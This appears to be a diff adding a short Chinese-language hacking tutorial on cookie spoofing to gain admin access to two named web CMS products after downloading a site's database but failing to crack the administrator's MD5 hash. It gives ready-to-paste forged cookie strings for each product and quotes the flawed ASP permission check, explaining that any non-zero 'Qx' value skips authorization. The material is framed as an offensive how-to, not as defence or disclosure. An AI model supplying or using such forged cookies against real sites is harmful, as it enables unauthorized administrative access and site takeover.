@@ -1,0 +1,45 @@
+cookis欺骗的利用
+
+我们来讲一下比较有意思的COOKIS欺骗
+当你知道了管理员MD5密码的时候 却又破不出来
+这个时候我们就要用到了cookis欺骗
+当
+
+
+一、什么是cookie：
+
+cookie是你访问的网站或者论坛在你机器里留下的一种记录文件.
+
+可以记录你的访问信息，有些网站或论坛的自动登录功能就是通过cookie实现的.
+
+常存放的地方：C:\Documents and Settings\当前用户名\Cookies
+
+为了教程演示我已经全部删除了  
+
+二.欺骗演示：（下载了对方的数据库，但是MD5破不出，就可用以下方法）
+
+迅时3.0版本
+
+Cookie欺骗代码admindj=1;adminuser=admin;adminpass=21232f297a57a5a743894a0e4a801fc3
+
+Adminuser后为管理员名， adminpass后面为MD5破不出来的密码
+
+数字图腾2.0
+Cookies=usercookies=0&AdminName=admin&Qx=1
+
+原理解释 后台验证为cookise时 没有经过数据库2次验证 且看代码 这个时候对大家讲解代码可能有点早 能理解可以理解一下
+
+
+<%
+Qx=Request.Cookies("Cookies")("Qx")
+if qx=0 then
+response.write "<script language='javascript'>" & chr(13)
+		response.write "alert('对不起你的权限不允许进行此项操作!');" & Chr(13)
+		response.write "</script>" & Chr(13)
+response.Write("<script language=javascript>history.go(-1);</script>") 
+response.end
+else
+end if
+%>
+
+注意这里，当QX=0时 说你无权限 下面就没有任何验证了 所以我们只要QX不等于0就可以
